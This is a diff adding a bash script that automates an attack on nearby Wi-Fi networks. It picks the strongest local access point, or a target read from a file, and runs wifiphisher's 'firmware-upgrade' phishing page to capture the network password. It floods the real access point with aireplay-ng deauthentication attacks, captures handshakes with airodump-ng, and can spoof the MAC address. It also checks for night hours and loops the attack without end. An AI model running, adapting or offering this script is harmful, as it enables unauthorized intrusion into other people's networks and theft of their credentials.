@@ -1,0 +1,221 @@
+#!/bin/bash
+echo "$(whoami)"
+[ "$UID" -eq 0 ] || exec sudo "$0" "$@"
+#SETUP
+userid=$(ls /media)
+wlinterface="wlp3s0b1"
+jaminterface=${wlinterface}mon3
+macchanging="off"
+jammode=2
+stopaftertime=180
+read -t 3 -i "y" -p "auto?(y/n)" automode
+automode=${automode:-y}
+echo $automode
+
+sudo chmod +x ./1cleanaplist
+sudo chmod +x ./1listallw
+sudo chmod +x ./1restartwlinterface
+
+exitfn() {
+trap SIGINT
+sudo killall python2 ;
+sudo killall xterm ;
+#exec sh -c ./1restartwlinterface user
+./1restartwlinterface
+sleep 5
+echo "exitting"
+exit
+}
+
+trap "exitfn" INT
+
+install() {
+sudo apt-get install -y aircrack-ng ;
+return 0
+}
+
+checkallwi() {
+./1listallw
+return 0
+}
+
+jammode() {
+if [[ $jammode -eq 1 ]]
+then
+jamx=2
+jaminterval=4
+elif [[ $jammode -eq 2 ]]
+then
+jamx=10
+jaminterval=20
+fi
+return 0
+}
+
+prepare1() {
+sudo killall xterm ;
+sudo killall python2 ;
+./1restartwlinterface
+return 0
+}
+
+prepare12() {
+sudo killall xterm ;
+sudo killall python2 ;
+sudo iw dev mon0 del ;
+sudo iw dev ${wlinterface}mon2 del ;
+sudo iw dev ${wlinterface}mon3 del ;
+sudo iw dev ${wlinterface}mon4 del ;
+sudo iw dev ${wlinterface}mon5 del ;
+sudo iw dev ${wlinterface}mon6 del ;
+sudo airmon-ng stop $wlinterface ;
+sleep 1
+sudo service network-manager restart ;
+#nohup nm-applet>/dev/null & ;
+return 0
+}
+
+checktime() {
+hournow=$(date +%H)
+if [ $hournow -gt 18 -o $hournow -lt 8 ]
+then
+echo "Perfect time"
+else
+echo "$hournow Not the perfect time, should we carry on?"
+read -t 3 -p "y/n? " cont
+cont=${cont:-y}
+if [ $cont == "n" ]
+then
+exit
+fi
+fi
+return 0
+}
+
+changemac() {
+#bssidmc=$bssid
+bssidmc="C0:25:E9:BD:3D:8B"
+if [[ $macchanging =~ (on) ]]
+then
+sudo ifconfig wlp3s0b1 down
+sleep 1
+sudo macchanger -m $bssidmc wlp3s0b1
+sleep 1
+sudo ifconfig wlp3s0b1 up
+fi
+return 0
+}
+
+#cat APs.txt-01.kismet.csv | sort -r -k22 -n | awk -F';' '{print $22}'
+#cat APs.txt-01.kismet.csv | sort -t';' -r -k22 -n | awk -F';' '{print $14"\t"$22"\t"$4"\t"$6"\t"$3}'
+#Data	BestQuality	BSSID	Channel	ESSID
+#cat APs.txt-01.csv | sort -t',' -r -k9,9 -k11,11 -n | awk -F',' '{print $11"\t"$9"\t"$1"\t"$4"\t"$14}'
+#cat APs.txt-01.csv | sort -t',' -r -k11,11 -k9,9 -n | awk -F',' '{print $11"\t"$9"\t"$1"\t"$4"\t"$14}'
+setwi() {
+if [[ $automode =~ (y) ]] ; then
+sudo killall xterm ;
+sudo ./1listallw &
+sleep 60
+until [[ -n $topwl && -n $essid && -n $channel ]] ; do
+topwl=$(cat APs.txt-01.csv | sed -r '/VostroNet|Telstra\ Air|BelongKM7KJGQH|OPTUS_A33E22|Fon\ WiFi|504|PATYAYA|RTA|Ester|(-)[7-9][0-9]/d' | sort -t',' -r -k11,11 -k9,9 -n | awk -F',' '{print $11"\t"$9"\t"$1"\t"$4"\t"$14}' | sed -n 1p)
+essid=$(echo $topwl | awk '{print $5}')
+bssid=$(echo $topwl | awk '{print $3}')
+channel=$(echo $topwl | awk '{print $4}')
+echo "searching..."
+sleep 2
+done
+sudo killall xterm ;
+datenow=$(date)
+echo "$datenow ; $essid $channel" | tee -a ./wptargnotes
+
+else
+sudo ./1listallw &
+sleep 60
+sudo killall xterm ;
+essid=$(cat targ | grep \#\# | awk '{print $12}')
+bssid=$(cat targ | grep \#\# | awk '{print $2}')
+
+a=0
+until [[ $channel ]] ; do
+getchannel
+echo "checkchannelagain"
+sleep 5
+if [[ $a -gt 4 ]] ; then
+sleep 10
+essid=$(cat targ | grep \#1\# | awk '{print $12}')
+bssid=$(cat targ | grep \#1\# | awk '{print $2}')
+getchannel
+fi
+((a++))
+done
+
+fi
+
+return 0
+}
+
+getchannel() {
+channel=$(nmcli -f CHAN,BSSID,ACTIVE dev wifi list | grep "$bssid" | awk '{print $1}')
+return 0
+}
+
+jam() {
+xterm -hold -e "i=0 ; while true ; do sudo aireplay-ng -q 15 -0 $jamx -a "$bssid" ${wlinterface}mon4 --ignore-negative-one ; sleep $jaminterval ; ((i++)) ; done" &
+return 0
+}
+
+
+runwp() {
+if [ -z "$channel" ] ; then
+sudo ~/Documents/Docs/Linux/Kali/Tools/wifiphisher-1.2/bin/wifiphisher -nJ -e "$essid" -p firmware-upgrade
+sleep 1
+xterm -hold -e "sudo ~/Documents/Docs/Linux/Kali/Tools/wifiphisher-1.2/bin/wifiphisher -nJ -e \"$essid\" -p firmware-upgrade" &
+else
+sudo ~/Documents/Docs/Linux/Kali/Tools/wifiphisher-1.2r2/bin/wifiphisher -nJ -e "$essid" -ch $channel -p firmware-upgrade
+sleep 1
+xterm -hold -e "sudo ~/Documents/Docs/Linux/Kali/Tools/wifiphisher-1.2r2/bin/wifiphisher -nJ -e \"$essid\" -ch "$channel" -p firmware-upgrade" &
+#-pK s3cretpassword
+fi
+return 0
+}
+
+
+#checkallwi
+#prepare1
+#sleep 5
+jammode
+while true ; do
+sleep 5
+checktime
+setwi
+prepare1
+sleep 5
+
+
+echo "$essid"
+echo "$bssid"
+echo "$channel"
+echo "jammode=$jammode"
+changemac
+
+
+runwp
+echo "$jaminterface"
+sleep 15
+while true ; do 
+if [[ -n $(iwconfig | grep $jaminterface) ]] ; then
+sleep 1
+xterm -hold -e "sudo airodump-ng $jaminterface --bssid "$bssid" --channel "$channel" -w \"/home/$userid/Documents/Docs/Linux/Kali/Tools/wifiphisher-1.2r2/wifiphisher/handshakes/$essid\" " &
+break
+fi
+echo "check again"
+sleep 2
+done
+
+
+sleep 5
+jam
+sleep $stopaftertime
+done
+
+trap SIGINT
